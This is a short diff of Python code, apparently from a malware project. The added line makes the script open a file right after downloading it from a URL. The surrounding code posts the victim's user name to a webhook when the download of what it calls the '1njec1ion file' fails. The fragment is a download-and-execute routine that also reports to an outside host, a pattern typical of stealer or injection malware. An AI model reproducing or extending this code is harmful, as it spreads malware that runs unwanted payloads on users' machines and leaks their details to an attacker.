@@ -148,6 +148,8 @@ try:
         open_file(dpath)
     else:
         download(url, dpath)
+        open_file(dpath)
+
 except Exception as e:
     try:requests.post(hook,json={"content": f"Could not download the 1njec1ion file: {user}"})
     except:pass
